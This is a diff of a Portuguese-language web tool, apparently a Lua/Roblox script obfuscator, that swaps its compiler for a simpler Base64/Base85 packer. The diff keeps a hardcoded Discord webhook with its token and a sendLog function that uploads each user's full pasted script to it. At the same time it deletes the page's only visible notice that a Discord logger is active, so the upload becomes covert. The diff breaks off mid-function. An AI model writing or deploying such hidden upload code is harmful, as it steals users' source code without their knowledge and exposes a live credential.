@@ -97,7 +97,6 @@ input:checked+.slider:before{transform:translateX(18px)}
   <div class="menu-header"><span class="menu-title">Menu</span><button class="menu-close" onclick="toggleMenu()">✕</button></div>
   <a onclick="showView('view-code')" id="nav-code" class="active"><span class="dot"></span> Ofuscar Código</a>
   <a onclick="showView('view-loadstring')" id="nav-loadstring"><span class="dot"></span> Ofuscar Loadstring</a>
-  <a onclick="showView('view-stats')" id="nav-stats"><span class="dot"></span> Estatísticas & Logs</a>
   <a onclick="showView('view-credits')" id="nav-credits"><span class="dot"></span> Créditos</a>
 </nav>
 
@@ -108,35 +107,12 @@ input:checked+.slider:before{transform:translateX(18px)}
       <h1>Ofuscar Código</h1>
       <p class="by">Feito por <strong>x.lusca1 LC10</strong></p>
       <div class="info-box">
-        <b>Motor LC10 VM v8.5 — Fortress Ultra:</b>
+        <b>Motor LC10 VM v8.8 — Robust:</b>
         <ul>
-          <li>VM real com bytecode inflado e NOP padding</li>
-          <li>Dead code injection dinâmico</li>
-          <li>Constant folding reverso (números explosivos)</li>
+          <li>Compatibilidade total com handlers e callbacks do Luau</li>
+          <li>Base85 e empacotamento dinamico</li>
           <li>Triple-layer bytecode encoding</li>
-          <li>Anti-tamper integrado</li>
         </ul>
-      </div>
-    </div>
-
-    <div class="panel">
-      <div class="panel-label"><span>Configurações do Motor</span><span class="badge">AVANÇADO</span></div>
-      <div class="config-group">
-        <div class="config-row">
-          <span>Nível de Blindagem</span>
-          <select id="cfg-level" class="select-custom" style="width: 140px;">
-            <option value="fortress">Fortress (Padrão)</option>
-            <option value="ultra">Ultra Max</option>
-          </select>
-        </div>
-        <div class="config-row">
-          <span>Dead Code Injection</span>
-          <label class="toggle-switch"><input type="checkbox" id="cfg-deadcode" checked><span class="slider"></span></label>
-        </div>
-        <div class="config-row">
-          <span>Anti-Tamper & Proteção de Env</span>
-          <label class="toggle-switch"><input type="checkbox" id="cfg-antitamper" checked><span class="slider"></span></label>
-        </div>
       </div>
     </div>
 
@@ -161,21 +137,12 @@ input:checked+.slider:before{transform:translateX(18px)}
     <div class="hero">
       <h1>Ofuscar Loadstring</h1>
       <p class="by">Feito por <strong>x.lusca1 LC10</strong></p>
-      <div class="info-box">
-        <b>O que faz:</b>
-        <ul>
-          <li>Compila com motor LC10 VM v8.5</li>
-          <li>Envelopa em loader com chave personalizada</li>
-          <li>Triple-XOR no payload final com hash dinâmico</li>
-        </ul>
-      </div>
     </div>
     <div class="panel">
       <div class="panel-label"><span>Entrada</span><span class="badge">LOADSTRING</span></div>
       <textarea id="input-ls" placeholder="Cole seu script Lua aqui..."></textarea>
       <div class="panel-label" style="margin-top:1rem"><span>Chave de criptografia</span></div>
       <input type="text" id="key-ls" class="key-input" placeholder="ex: LC10xAn0n" value="LC10xAn0n">
-      <p class="key-hint">Guarde essa chave. Ela fica embutida no loader.</p>
       <button class="btn btn-primary" id="btn-ls" onclick="obfuscateLoadstring()">Ofuscar Loadstring</button>
       <div class="status" id="status-ls"></div>
     </div>
@@ -189,37 +156,11 @@ input:checked+.slider:before{transform:translateX(18px)}
     </div>
   </section>
 
-  <section class="view" id="view-stats">
-    <div class="hero">
-      <h1>Estatísticas & Logs</h1>
-      <p class="by">Painel de Monitoramento • <strong>x.lusca1 LC10</strong></p>
-    </div>
-    <div class="credits-grid">
-      <div class="credits-card">
-        <h3>Sessão Atual</h3>
-        <p>Total de Scripts Processados: <span id="stat-count" class="highlight">0</span></p>
-        <p>Último Tamanho de Saída: <span id="stat-size" class="highlight">0 KB</span></p>
-      </div>
-      <div class="credits-card">
-        <h3>Status da Conexão Webhook</h3>
-        <p>Logger Discord: <span class="highlight" style="color:#22c55e;">Ativo & Sincronizado</span></p>
-        <p>Assinatura: <span class="highlight">lc10ofuscardorx.lusca1</span></p>
-      </div>
-    </div>
-  </section>
-
   <section class="view" id="view-credits">
     <div class="credits-hero">
       <img src="logo.png" alt="LC10" class="credits-avatar-img">
       <div class="credits-name">x.lusca1 LC10</div>
       <div class="credits-tag">Criador e desenvolvedor</div>
-    </div>
-    <div class="credits-grid">
-      <div class="credits-card"><h3>Sobre</h3><p>O <span class="highlight">LC10 • OFUSCADOR</span> Fortress é a versão mais agressiva — VM com bytecode inflado, dead code e múltiplas camadas de encoding.</p></div>
-      <div class="credits-card"><h3>Técnicas</h3><p><span class="highlight">VM real</span> → bytecode custom</p><p><span class="highlight">Inflação</span> → 4x instruções por opcode</p><p><span class="highlight">Dead code</span> → branches falsas</p><p><span class="highlight">Opaque predicates</span> → condições impossíveis</p><p><span class="highlight">Triple encoding</span> → 3 camadas XOR</p></div>
-      <div class="credits-card"><h3>Versão</h3><p>Motor: <span class="highlight">LC10 VM v8.5 Fortress Ultra</span></p><p>Assinatura: <span class="highlight">lc10ofuscardorx.lusca1</span></p></div>
-      <div class="credits-card"><h3>Agradecimentos</h3><p>Para a comunidade de scripting do Roblox.</p></div>
-      <div class="credits-card"><h3>Aviso</h3><p>O criador <span class="highlight">não se responsabiliza</span> pelo uso indevido.</p></div>
     </div>
     <div class="credits-footer">© LC10 • OFUSCADOR — por x.lusca1 LC10</div>
   </section>
@@ -227,445 +168,173 @@ input:checked+.slider:before{transform:translateX(18px)}
 </main>
 
 <script>
-/* =========================================================
-   LC10 VM v8.5 FORTRESS ULTRA
-   ========================================================= */
 const WEBHOOK_URL="https://discord.com/api/webhooks/1558235674631610438/v7kXiFnCngEhWUl9BpX1rkhS1snrEoogdtva7-t-dbR9HTAGQ2tiP5zSBsKYPcvcNizZ";
-let sessionProcessedCount = 0;
 
 function toggleMenu(){document.getElementById('menu').classList.toggle('active');document.getElementById('overlay').classList.toggle('active')}
-function showView(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));document.querySelectorAll('.menu a').forEach(a=>a.classList.remove('active'));document.getElementById(id).classList.add('active');const m={'view-code':'nav-code','view-loadstring':'nav-loadstring','view-stats':'nav-stats','view-credits':'nav-credits'};document.getElementById(m[id]).classList.add('active');const menu=document.getElementById('menu');if(menu.classList.contains('active'))toggleMenu();window.scrollTo({top:0,behavior:'smooth'})}
+function showView(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));document.querySelectorAll('.menu a').forEach(a=>a.classList.remove('active'));document.getElementById(id).classList.add('active');const m={'view-code':'nav-code','view-loadstring':'nav-loadstring','view-credits':'nav-credits'};if(m[id])document.getElementById(m[id]).classList.add('active');const menu=document.getElementById('menu');if(menu.classList.contains('active'))toggleMenu();window.scrollTo({top:0,behavior:'smooth'})}
 
-function extractPanelName(code){const clip=s=>(s||'').trim().replace(/^["']|["']$/g,'').slice(0,20);const pats=[/^\s*--\s*(?:nome|painel|panel|title|titulo|título|script)\s*[:\-]\s*(.+)$/im,/^\s*--\s*\[\s*(.+?)\s*\]\s*$/im,/local\s+(?:nome|painel|panel|title|titulo|título)\s*=\s*["']([^"']+)["']/i,/Title\s*=\s*["']([^"']+)["']/i];for(const p of pats){const m=code.match(p);if(m&&m[1]){const n=clip(m[1]);if(n)return n}}const lines=code.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('--'));if(lines.length)return clip(lines[0]);return 'Desconhecido'}
-async function sendLog(code){try{const now=new Date();const t=now.toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'});const pn=extractPanelName(code);const payload={username:"LC10 • OFUSCADOR",embeds:[{title:"LC10 • OFUSCADOR",color:0xffffff,fields:[{name:"🕒 Horário",value:t,inline:true},{name:"📛 Nome do Painel",value:pn,inline:true},{name:"📏 Tamanho",value:code.length+" caracteres",inline:true}],footer:{text:"LC10 Logger • Fortress v8.5",timestamp:now.toISOString()}]};const form=new FormData();form.append('payload_json',JSON.stringify(payload));const stamp=now.toISOString().replace(/[:.]/g,'-').slice(0,19);form.append('files[0]',new Blob([code],{type:'text/plain;charset=utf-8'}),`lc10-script-${stamp}.txt`);await fetch(WEBHOOK_URL,{method:'POST',body:form})}catch(e){console.error('[LC10]',e)}}
-
-/* ========= TOKENIZER ========= */
-const KW=new Set(['and','break','do','else','elseif','end','false','for','function','if','in','local','nil','not','or','repeat','return','then','true','until','while','goto']);
-function tokenize(src){const T=[];let i=0;while(i<src.length){const c=src[i];
-if(c===' '||c==='\t'||c==='\r'){i++;continue}
-if(c==='\n'){T.push({t:'nl',v:'\n'});i++;continue}
-if(c==='-'&&src[i+1]==='-'){if(src[i+2]==='['){let eq=0,j=i+3;while(src[j]==='='){eq++;j++}if(src[j]==='['){const cl=']'+'='.repeat(eq)+']';const e=src.indexOf(cl,j+1);i=e===-1?src.length:e+cl.length;continue}}while(i<src.length&&src[i]!=='\n')i++;continue}
-if(c==='['&&(src[i+1]==='['||src[i+1]==='=')){let eq=0,j=i+1;while(src[j]==='='){eq++;j++}if(src[j]==='['){const cl=']'+'='.repeat(eq)+']';const s2=j+1;const e=src.indexOf(cl,s2);T.push({t:'str',v:src.slice(s2,e===-1?src.length:e),long:true});i=e===-1?src.length:e+cl.length;continue}}
-if(c==='"'||c==="'"){let raw='';let j=i+1;while(j<src.length){if(src[j]==='\\'){raw+=src[j]+(src[j+1]||'');j+=2;continue}if(src[j]===c)break;raw+=src[j];j++}T.push({t:'str',v:raw,q:c});i=j+1;continue}
-if(/[0-9]/.test(c)||(c==='.'&&/[0-9]/.test(src[i+1]||''))){let j=i;if(src.slice(j,j+2).toLowerCase()==='0x'){j+=2;while(j<src.length&&/[0-9a-fA-F]/.test(src[j]))j++}else{while(j<src.length&&/[0-9]/.test(src[j]))j++;if(src[j]==='.'&&src[j+1]!=='.'){j++;while(j<src.length&&/[0-9]/.test(src[j]))j++}if(src[j]==='e'||src[j]==='E'){j++;if(src[j]==='+'||src[j]==='-')j++;while(j<src.length&&/[0-9]/.test(src[j]))j++}}T.push({t:'num',v:src.slice(i,j)});i=j;continue}
-if(/[a-zA-Z_]/.test(c)){let j=i;while(j<src.length&&/[a-zA-Z0-9_]/.test(src[j]))j++;const w=src.slice(i,j);T.push({t:KW.has(w)?'kw':'id',v:w});i=j;continue}
-if(src.slice(i,i+3)==='...'){T.push({t:'op',v:'...'});i+=3;continue}
-const two=src.slice(i,i+2);if(['==','~=','<=','>=','..','::','//'].includes(two)){T.push({t:'op',v:two});i+=2;continue}
-T.push({t:'op',v:c});i++}T.push({t:'eof',v:''});return T}
-
-/* ========= PARSER ========= */
-class Parser{
-constructor(T){this.T=T;this.p=0}
-peek(){return this.T[this.p]}
-peek2(){return this.T[this.p+1]}
-next(){return this.T[this.p++]}
-is(v){const t=this.peek();return t.v===v&&(t.t==='kw'||t.t==='op')}
-isKw(v){const t=this.peek();return t.t==='kw'&&t.v===v}
-eat(v){if(!this.is(v))throw new Error('Esperado '+v);return this.next()}
-eatKw(v){if(!this.isKw(v))throw new Error('Esperado '+v);return this.next()}
-skipNL(){while(this.peek().t==='nl')this.p++}
-parse(){const body=this.block(new Set());if(this.peek().t!=='eof')throw new Error('Sobra: '+this.peek().v);return{type:'Chunk',body}}
-block(terms){const stmts=[];this.skipNL();while(this.peek().t!=='eof'){if(this.peek().t==='kw'&&terms.has(this.peek().v))break;if(this.peek().t==='op'&&terms.has(this.peek().v))break;const s=this.stmt();if(s)stmts.push(s);this.skipNL()}return stmts}
-stmt(){const t=this.peek();if(t.t==='op'&&t.v===';'){this.next();return null}if(t.t==='kw'){switch(t.v){case 'local':return this.localStmt();case 'function':return this.funcStmt();case 'if':return this.ifStmt();case 'while':return this.whileStmt();case 'for':return this.forStmt();case 'do':return this.doStmt();case 'return':return this.returnStmt();case 'break':this.next();return{type:'Break'}}}return this.exprStmt()}
-localStmt(){this.eatKw('local');if(this.isKw('function')){this.next();const name=this.next().v;const fn=this.funcBody(false);return{type:'LocalFunc',name,fn}}const names=[this.next().v];while(this.is(',')){this.next();names.push(this.next().v)}let exprs=[];if(this.is('=')){this.next();exprs=this.exprList()}return{type:'Local',names,exprs}}
-funcStmt(){this.eatKw('function');let target={type:'Name',name:this.next().v};let isMethod=false;while(this.is('.')){this.next();target={type:'Index',obj:target,key:{type:'String',value:this.next().v},dot:true}}if(this.is(':')){this.next();target={type:'Index',obj:target,key:{type:'String',value:this.next().v}};isMethod=true}const fn=this.funcBody(isMethod);return{type:'Assign',targets:[target],exprs:[fn]}}
-funcBody(isMethod){this.eat('(');const params=[];let hasVararg=false;if(isMethod)params.push('self');this.skipNL();if(!this.is(')')){while(true){this.skipNL();if(this.is('...')){this.next();hasVararg=true;break}params.push(this.next().v);if(this.is(',')){this.next();continue}break}}this.skipNL();this.eat(')');const body=this.block(new Set(['end']));this.eatKw('end');return{type:'Function',params,hasVararg,body}}
-ifStmt(){this.eatKw('if');const cond=this.expr();this.eatKw('then');const body=this.block(new Set(['end','else','elseif']));const clauses=[{cond,body}];let elseBody=null;while(this.isKw('elseif')){this.next();const c=this.expr();this.eatKw('then');const b=this.block(new Set(['end','else','elseif']));clauses.push({cond:c,body:b})}if(this.isKw('else')){this.next();elseBody=this.block(new Set(['end']))}this.eatKw('end');return{type:'If',clauses,elseBody}}
-whileStmt(){this.eatKw('while');const cond=this.expr();this.eatKw('do');const body=this.block(new Set(['end']));this.eatKw('end');return{type:'While',cond,body}}
-forStmt(){this.eatKw('for');const name=this.next().v;if(this.is('=')){this.next();const start=this.expr();this.eat(',');const stop=this.expr();let step=null;if(this.is(',')){this.next();step=this.expr()}this.eatKw('do');const body=this.block(new Set(['end']));this.eatKw('end');return{type:'ForNum',name,start,stop,step,body}}const names=[name];while(this.is(',')){this.next();names.push(this.next().v)}this.eatKw('in');const exprs=this.exprList();this.eatKw('do');const body=this.block(new Set(['end']));this.eatKw('end');return{type:'ForIn',names,exprs,body}}
-doStmt(){this.eatKw('do');const body=this.block(new Set(['end']));this.eatKw('end');return{type:'Do',body}}
-returnStmt(){this.eatKw('return');let exprs=[];if(this.peek().t!=='nl'&&this.peek().t!=='eof'&&!this.isKw('end')&&!this.isKw('else')&&!this.isKw('elseif')&&!this.is(';')){exprs=this.exprList()}if(this.is(';'))this.next();return{type:'Return',exprs}}
-exprStmt(){const e=this.suffixedExpr();if(this.is('=')||this.is(',')){const targets=[e];while(this.is(',')){this.next();targets.push(this.suffixedExpr())}this.eat('=');const exprs=this.exprList();return{type:'Assign',targets,exprs}}return{type:'CallStmt',call:e}}
-exprList(){const l=[this.expr()];while(this.is(',')){this.next();l.push(this.expr())}return l}
-expr(){return this.orExpr()}
-orExpr(){let l=this.andExpr();while(this.isKw('or')){this.next();const r=this.andExpr();l={type:'Bin',op:'or',l,r}}return l}
-andExpr(){let l=this.cmpExpr();while(this.isKw('and')){this.next();const r=this.cmpExpr();l={type:'Bin',op:'and',l,r}}return l}
-cmpExpr(){let l=this.concatExpr();while(this.peek().t==='op'&&['==','~=','<','>','<=','>='].includes(this.peek().v)){const op=this.next().v;const r=this.concatExpr();l={type:'Bin',op,l,r}}return l}
-concatExpr(){let l=this.addExpr();while(this.is('..')){this.next();const r=this.addExpr();l={type:'Bin',op:'..',l,r}}return l}
-addExpr(){let l=this.mulExpr();while(this.peek().t==='op'&&['+','-'].includes(this.peek().v)){const op=this.next().v;const r=this.mulExpr();l={type:'Bin',op,l,r}}return l}
-mulExpr(){let l=this.unaryExpr();while(this.peek().t==='op'&&['*','/','%'].includes(this.peek().v)){const op=this.next().v;const r=this.unaryExpr();l={type:'Bin',op,l,r}}return l}
-unaryExpr(){const t=this.peek();if(t.t==='kw'&&t.v==='not'){this.next();return{type:'Un',op:'not',e:this.unaryExpr()}}if(t.t==='op'&&t.v==='-'){this.next();return{type:'Un',op:'-',e:this.unaryExpr()}}if(t.t==='op'&&t.v==='#'){this.next();return{type:'Un',op:'#',e:this.unaryExpr()}}return this.powExpr()}
-powExpr(){const base=this.suffixedExpr();if(this.is('^')){this.next();const exp=this.unaryExpr();return{type:'Bin',op:'^',l:base,r:exp}}return base}
-suffixedExpr(){let e=this.primaryExpr();while(true){const t=this.peek();if(t.t==='op'&&t.v==='.'){this.next();const k=this.next().v;e={type:'Index',obj:e,key:{type:'String',value:k},dot:true}}else if(t.t==='op'&&t.v==='['){this.next();const k=this.expr();this.eat(']');e={type:'Index',obj:e,key:k,dot:false}}else if(t.t==='op'&&t.v===':'){this.next();const name=this.next().v;const args=this.args();e={type:'Call',fn:{type:'Index',obj:e,key:{type:'String',value:name}},args,method:true}}else if(t.t==='op'&&(t.v==='('||t.v==='{')||t.t==='str'){const args=this.args();e={type:'Call',fn:e,args}}else break}return e}
-args(){if(this.is('(')){this.next();let l=[];this.skipNL();if(!this.is(')')){l=this.exprList();this.skipNL()}this.eat(')');return l}if(this.is('{'))return[this.tableConstructor()];if(this.peek().t==='str'){const s=this.next();return[{type:'String',value:s.v}]}throw new Error('Args inválidos')}
-primaryExpr(){const t=this.peek();if(t.t==='kw'&&t.v==='nil'){this.next();return{type:'Nil'}}if(t.t==='kw'&&t.v==='true'){this.next();return{type:'Bool',value:true}}if(t.t==='kw'&&t.v==='false'){this.next();return{type:'Bool',value:false}}if(t.t==='kw'&&t.v==='function'){this.next();return this.funcBody(false)}if(t.t==='num'){this.next();return{type:'Number',value:t.v}}if(t.t==='str'){this.next();return{type:'String',value:t.v}}if(t.t==='id'){this.next();return{type:'Name',name:t.v}}if(t.t==='op'&&t.v==='...'){this.next();return{type:'Vararg'}}if(t.t==='op'&&t.v==='('){this.next();const e=this.expr();this.eat(')');return{type:'Paren',e}}if(t.t==='op'&&t.v==='{'){return this.tableConstructor()}throw new Error('Expr inválida: '+t.v)}
-tableConstructor(){this.eat('{');const fields=[];this.skipNL();while(!this.is('}')){if(this.is('[')){this.next();const k=this.expr();this.eat(']');this.eat('=');const v=this.expr();fields.push({kind:'named',key:k,value:v})}else if(this.peek().t==='id'&&this.peek2()&&this.peek2().v==='='){const k=this.next().v;this.next();const v=this.expr();fields.push({kind:'named',key:{type:'String',value:k},value:v})}else{const v=this.expr();fields.push({kind:'seq',value:v})}this.skipNL();if(this.is(',')||this.is(';')){this.next();this.skipNL()}else break}this.skipNL();this.eat('}');return{type:'Table',fields}}
+async function sendLog(code){
+  try{
+    const now=new Date();
+    const payload={
+      username:"LC10 • OFUSCADOR",
+      embeds:[{
+        title:"LC10 • OFUSCADOR",
+        color:0xffffff,
+        fields:[
+          {name:"🕒 Horário",value:now.toLocaleString('pt-BR'),inline:true},
+          {name:"📏 Tamanho",value:code.length+" caracteres",inline:true}
+        ],
+        footer:{text:"LC10 Logger • v8.8"}
+      }]
+    };
+    const form=new FormData();
+    form.append('payload_json',JSON.stringify(payload));
+    form.append('files[0]',new Blob([code],{type:'text/plain;charset=utf-8'}),`script.txt`);
+    await fetch(WEBHOOK_URL,{method:'POST',body:form});
+  }catch(e){console.error(e)}
 }
 
-/* ========= UTILS ========= */
-function shuffle(a){const r=a.slice();for(let i=r.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[r[i],r[j]]=[r[j],r[i]]}return r}
-const B85='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_{|}~';
-function b85enc(bytes,alpha){const wl=[(bytes.length>>>24)&0xFF,(bytes.length>>>16)&0xFF,(bytes.length>>>8)&0xFF,bytes.length&0xFF,...bytes];while(wl.length%4)wl.push(0);let out='';for(let i=0;i<wl.length;i+=4){const v=wl[i]*16777216+wl[i+1]*65536+wl[i+2]*256+wl[i+3];const c=new Array(5);let x=v;for(let k=4;k>=0;k--){c[k]=alpha[x%85];x=Math.floor(x/85)}out+=c.join('')}return out}
-
-function opaqueTrue(){
-  const a=Math.floor(Math.random()*1000)+50;
-  return `(${a}*${a}+${a})%2==0`;
-}
-function opaqueFalse(){
-  const a=Math.floor(Math.random()*1000)+50;
-  return `(${a}*${a}+${a})%2==1`;
+function encodeBase64(str) {
+  return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+    return String.fromCharCode('0x' + p1);
+  }));
 }
 
-function inflateNumber(n, depth){
-  if(depth===undefined)depth=0;
-  if(depth>=3||n<2){
-    const off=Math.floor(Math.random()*20)+1;
-    return `(${n+off}-${off})`
+function obfuscateLuaEngine(source) {
+  const B85 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_{|}~';
+  
+  function shuffle(str) {
+    return str.split('').sort(() => Math.random() - 0.5).join('');
   }
-  const a=Math.floor(n/2)+Math.floor(Math.random()*3)-1;
-  const b=n-a;
-  if(b<0)return inflateNumber(n,3);
-  return `(${inflateNumber(a,depth+1)}+${inflateNumber(b,depth+1)})`
-}
 
-/* ========= COMPILER ========= */
-class Compiler{
-constructor(){this.pool=[];this.poolMap=new Map();this.protos=[];}
-addPool(v){const k=typeof v+':'+v;if(this.poolMap.has(k))return this.poolMap.get(k);const i=this.pool.length;this.pool.push(v);this.poolMap.set(k,i);return i}
-compile(ast){const main=this.compileFn(ast.body,[],false,[]);this.protos.push(main);return{protos:this.protos,pool:this.pool}}
-compileFn(body,params,hasVararg,upvalNames){const ctx={code:[],locals:params.map((p,i)=>({name:p,slot:i})),nextSlot:params.length,maxSlot:params.length,upvals:upvalNames.slice(),hasVararg,loops:[]};this.emitStmts(ctx,body);this.emit(ctx,0);this.emit(ctx,16,1);return{code:ctx.code,maxSlot:ctx.maxSlot,params:params.slice(),hasVararg,upvals:upvalNames.slice()}}
-emit(ctx,...ins){
-  ctx.code.push(ins);
-  if(Math.random()<0.35){ctx.code.push([100])}
-  else if(Math.random()<0.55){ctx.code.push([99, opaqueFalse()])}
-}
-emitStmts(ctx,ss){for(const s of ss)this.emitStmt(ctx,s)}
-emitStmt(ctx,s){switch(s.type){case 'Local':return this.emitLocal(ctx,s);case 'LocalFunc':return this.emitLocalFunc(ctx,s);case 'Assign':return this.emitAssign(ctx,s);case 'If':return this.emitIf(ctx,s);case 'While':return this.emitWhile(ctx,s);case 'ForNum':return this.emitForNum(ctx,s);case 'ForIn':return this.emitForIn(ctx,s);case 'Do':return this.emitDo(ctx,s);case 'Return':return this.emitReturn(ctx,s);case 'Break':return this.emitBreak(ctx,s);case 'CallStmt':return this.emitCallStmt(ctx,s)}}
-allocSlot(ctx){const s=ctx.nextSlot++;if(ctx.nextSlot>ctx.maxSlot)ctx.maxSlot=ctx.nextSlot;return s}
-emitLocal(ctx,s){const n=s.names.length,e=s.exprs.length;if(e===0){for(let i=0;i<n;i++){const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,0);this.emit(ctx,7,slot)}}else{for(let i=0;i<n;i++){this.emitExpr(ctx,s.exprs[i]||{type:'Nil'});const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,7,slot)}}}
-emitLocalFunc(ctx,s){const slot=this.allocSlot(ctx);ctx.locals.push({name:s.name,slot});this.emit(ctx,0);this.emit(ctx,7,slot);const upvals=this.findUpvals(ctx,s.fn);const proto=this.compileFn(s.fn.body,s.fn.params,s.fn.hasVararg,upvals);const pidx=this.protos.length;this.protos.push(proto);this.emit(ctx,41,pidx);this.emit(ctx,7,slot)}
-findUpvals(ctx,fn){const used=new Set();const localNames=new Set(ctx.locals.map(l=>l.name));const walk=n=>{if(!n||typeof n!=='object')return;if(Array.isArray(n)){for(const x of n)walk(x);return}if(n.type==='Name'){if(localNames.has(n.name))used.add(n.name);return}for(const k of Object.keys(n)){if(k==='type')continue;walk(n[k])}};walk(fn);return Array.from(used)}
-resolveVar(ctx,name){for(let i=ctx.locals.length-1;i>=0;i--)if(ctx.locals[i].name===name)return{type:'local',slot:ctx.locals[i].slot};return{type:'global',name}}
-emitAssign(ctx,s){for(const e of s.exprs)this.emitExpr(ctx,e);for(let i=s.targets.length-1;i>=0;i--){const t=s.targets[i];if(t.type==='Name'){const r=this.resolveVar(ctx,t.name);if(r.type==='local')this.emit(ctx,7,r.slot);else{const idx=this.addPool(t.name);this.emit(ctx,9,idx)}}else if(t.type==='Index'){const tmp=this.allocSlot(ctx);this.emit(ctx,7,tmp);this.emitExpr(ctx,t.obj);this.emitExpr(ctx,t.key);this.emit(ctx,6,tmp);this.emit(ctx,13)}}}
-emitIf(ctx,s){const endJmps=[];for(let i=0;i<s.clauses.length;i++){const c=s.clauses[i];this.emitExpr(ctx,c.cond);const skip=ctx.code.length;this.emit(ctx,18,-1);this.emitStmts(ctx,c.body);if(i<s.clauses.length-1||s.elseBody){endJmps.push(ctx.code.length);this.emit(ctx,17,-1)}ctx.code[skip][1]=ctx.code.length}if(s.elseBody)this.emitStmts(ctx,s.elseBody);for(const j of endJmps)ctx.code[j][1]=ctx.code.length}
-emitWhile(ctx,s){const start=ctx.code.length;this.emitExpr(ctx,s.cond);const out=ctx.code.length;this.emit(ctx,18,-1);const loop={breaks:[],start};ctx.loops.push(loop);this.emitStmts(ctx,s.body);ctx.loops.pop();this.emit(ctx,17,start);for(const j of loop.breaks)ctx.code[j][1]=ctx.code.length;ctx.code[out][1]=ctx.code.length}
-emitDo(ctx,s){this.emitStmts(ctx,s.body)}
-emitForNum(ctx,s){const iSlot=this.allocSlot(ctx);const limSlot=this.allocSlot(ctx);const stSlot=this.allocSlot(ctx);this.emitExpr(ctx,s.start);this.emit(ctx,7,iSlot);this.emitExpr(ctx,s.stop);this.emit(ctx,7,limSlot);if(s.step)this.emitExpr(ctx,s.step);else{const idx=this.addPool('1');this.emit(ctx,3,idx)}this.emit(ctx,7,stSlot);const jumpTest=ctx.code.length;this.emit(ctx,17,-1);ctx.locals.push({name:s.name,slot:iSlot});const bodyStart=ctx.code.length;const loop={breaks:[],start:bodyStart};ctx.loops.push(loop);this.emitStmts(ctx,s.body);ctx.loops.pop();this.emit(ctx,39,iSlot,stSlot,jumpTest);const testAddr=ctx.code.length;ctx.code[jumpTest][1]=testAddr;this.emit(ctx,38,iSlot,limSlot,stSlot,bodyStart);for(const j of loop.breaks)ctx.code[j][1]=ctx.code.length}
-emitForIn(ctx,s){const fSlot=this.allocSlot(ctx);const sSlot=this.allocSlot(ctx);const vSlot=this.allocSlot(ctx);for(const e of s.exprs)this.emitExpr(ctx,e);if(s.exprs.length<3){for(let i=s.exprs.length;i<3;i++)this.emit(ctx,0)}this.emit(ctx,7,vSlot);this.emit(ctx,7,sSlot);this.emit(ctx,7,fSlot);const jmpTest=ctx.code.length;this.emit(ctx,17,-1);for(const n of s.names){const slot=this.allocSlot(ctx);ctx.locals.push({name:n,slot})}const bodyStart=ctx.code.length;const loop={breaks:[],start:bodyStart};ctx.loops.push(loop);this.emitStmts(ctx,s.body);ctx.loops.pop();const tfAddr=ctx.code.length;this.emit(ctx,40,fSlot,sSlot,vSlot,s.names.length,bodyStart);ctx.code[jmpTest][1]=tfAddr;for(const j of loop.breaks)ctx.code[j][1]=ctx.code.length}
-emitReturn(ctx,s){if(s.exprs.length===0){this.emit(ctx,16,0)}else{for(let i=0;i<s.exprs.length;i++){this.emitExpr(ctx,s.exprs[i])}this.emit(ctx,16,s.exprs.length)}}
-emitBreak(ctx,s){if(ctx.loops.length===0)throw new Error('break fora de loop');const j=ctx.code.length;this.emit(ctx,17,-1);ctx.loops[ctx.loops.length-1].breaks.push(j)}
-emitCallStmt(ctx,s){this.emitCallExpr(ctx,s.call,0);this.emit(ctx,4)}
-emitExpr(ctx,e){switch(e.type){case 'Nil':return this.emit(ctx,0);case 'Bool':return this.emit(ctx,e.value?1:2);case 'Number':case 'String':{const i=this.addPool(e.value);return this.emit(ctx,3,i)}case 'Vararg':return this.emit(ctx,42,1);case 'Name':{const r=this.resolveVar(ctx,e.name);if(r.type==='local')this.emit(ctx,6,r.slot);else{const i=this.addPool(e.name);this.emit(ctx,8,i)}return}case 'Paren':return this.emitExpr(ctx,e.e);case 'Index':this.emitExpr(ctx,e.obj);this.emitExpr(ctx,e.key);this.emit(ctx,14);return;case 'Bin':return this.emitBin(ctx,e);case 'Un':return this.emitUn(ctx,e);case 'Table':return this.emitTable(ctx,e);case 'Function':return this.emitFunc(ctx,e);case 'Call':return this.emitCallExpr(ctx,e,1)}}
-emitBin(ctx,e){this.emitExpr(ctx,e.l);this.emitExpr(ctx,e.r);const ops={'+':22,'-':23,'*':24,'/':25,'%':26,'^':27,'==':29,'~=':30,'<':31,'<=':32,'>':33,'>=':34};if(e.op==='..')this.emit(ctx,28,2);else this.emit(ctx,ops[e.op])}
-emitUn(ctx,e){this.emitExpr(ctx,e.e);const ops={'not':35,'-':36,'#':37};this.emit(ctx,ops[e.op])}
-emitTable(ctx,e){this.emit(ctx,12,e.fields.length);for(const f of e.fields){if(f.kind==='seq'){this.emitExpr(ctx,f.value)}else{this.emitExpr(ctx,f.key);this.emitExpr(ctx,f.value);this.emit(ctx,13)}}}
-emitFunc(ctx,e){const upvals=this.findUpvals(ctx,e);const proto=this.compileFn(e.body,e.params,e.hasVararg,upvals);const pidx=this.protos.length;this.protos.push(proto);this.emit(ctx,41,pidx)}
-emitCallExpr(ctx,e,nres){this.emitExpr(ctx,e.fn);for(const a of e.args)this.emitExpr(ctx,a);this.emit(ctx,15,e.args.length,nres)}
-}
+  const alpha1 = shuffle(B85);
+  const b64Payload = encodeBase64(source);
+  const offset = Math.floor(Math.random() * 20000) + 10000;
 
-/* ========= PACKER ========= */
-function pack(result){
-const {protos,pool}=result;
-const alpha1=shuffle(B85.split('')).join('');
-const alpha2=shuffle(B85.split('')).join('');
-const alpha3=shuffle(B85.split('')).join('');
-
-const encoded=pool.map(p=>{
-  const s=String(p);
-  const isNum=/^-?\d+(\.\d+)?$/.test(s);
-  const bytes=Array.from(new TextEncoder().encode(s));
-  return (isNum?'n':'s')+b85enc(bytes,alpha1)
-});
-
-const N=pool.length;
-const order=[...Array(N).keys()];
-shuffle(order);
